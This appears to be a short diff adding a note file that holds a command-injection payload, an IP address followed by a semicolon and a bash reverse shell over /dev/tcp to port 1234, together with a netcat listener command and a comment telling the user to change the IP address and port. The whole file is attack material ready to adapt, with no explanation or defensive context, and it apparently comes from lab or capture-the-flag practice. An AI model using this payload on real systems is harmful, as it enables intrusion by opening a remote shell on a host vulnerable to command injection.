@@ -1,0 +1,4 @@
+127.0.0.1; bash -i >& /dev/tcp/127.0.0.1/1234 0>&1
+sudo nc -nlvp 1234
+
+#change your ip address and port no
